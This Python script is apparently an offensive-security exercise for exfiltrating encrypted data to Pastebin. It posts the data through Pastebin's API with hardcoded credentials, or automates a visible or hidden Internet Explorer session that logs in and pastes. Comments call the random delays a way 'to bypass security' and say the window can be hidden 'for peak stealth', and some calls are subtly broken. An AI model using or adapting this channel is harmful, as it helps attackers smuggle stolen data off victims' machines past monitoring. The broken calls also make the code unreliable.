# Create a 𝗣𝗮𝘀𝘁𝗲𝗯𝗶𝗻 acount, so that we can test the script
# We are sending the encrypted information to an online server (pastebin) 

from win32com import client # For win specific

import os
import random
import requests # For platform-independent funtions
import time

# For auth
username = 'TestForPy'
password = 'seKret'
api_dev_key = 'cd3xxx001xxx02'

# logIn to paste bin
def plain_paste(title, contents):
    login_url = 'https://pastebin.com/api/api_login.php'
    login_data = {
        'api_dev_key':api_dev_key,
        'api_user_name':username,
        'api_user_password':password,
    }
    r = requests.post(login_url, data=login_data)
    api_user_key = r.text # retreive user key
    
    # Paste in the Pastebin account
    paste_url = 'https://pastebin.com/api/api_post.php'
    paste_data = {
        'api_paste_name': title,
        'api_paste_code': contents.decode(),
        'api_dev_key': api_dev_key,
        'api_use_key': api_user_key,
        'api_option': 'paste',
        'api_paste_private': 0,
    }
    
    r = requests.post(paste_url, data=paste_data)
    print(r.status_code)
    print(r.text)
    # Check pastebin to see if it worked
    
# Suport functions
def wait_for_browser(browser):
    # Ensures the browser has finished it's events
    while browser.ReadyState != 4 and browser.ReadyState != 'Complete':
        time.sleep(0.1)     

def random_sleep():
    # Ensures random behaviour to bypass security
    # Allows for task that do not gen events to execute in DOM (Document Object Model)
    time.sleep(random.randint(5, 10))

def login(ie):
    full_doc = ie.Document.all
    for elem in full_doc: # Revew all elms in dom
        if elem.id == "loginform-username": # User name field
            elem.setAttribute('value', username)
        elif elem.id == 'loginform-password': # Password field
            elem.setAttribute('value', password)
    
    random_sleep()
    
    if ie.Document.forms[0].id == 'w0':
        ie.document.forms[0].submit()
    
    wait_for_browser(ie)

def submit(ie, title, contents):
    full_doc = ie.Document.all
    for elem in full_doc: # Find in DOM
        if elem.id == 'postform-name': # Where to put title
            elem.setAttribute('value', title)
        elif elem.id == 'postform-text': # Where to paste message
            elem.setAttribute('value', contents)
    
    if ie.Document.forms[0].id == 'w0':
        ie.document.forms[0].submit()
    
    random_sleep()
    wait_for_browser(ie)

def ie_paste(title, contents):
    ie = client.Dispatch('InternetExplorer.Application')
    # New internet explorer COM instance
    ie.Visible = 1 # Make visible, can make 0 for peak stealth
    
    
    ie.Navigate('https://pastebin.com/login')
    wait_for_browser(ie)
    login(ie)
    
    ie.Navigate('https://pastebin.com/')
    wait_for_browser(ie)
    submit(ie, title, contents.decode())
    
    ie.Quit() # Kill when done
    
if __name__ == '__main__':
    ie_paste('title', 'contents')
    
    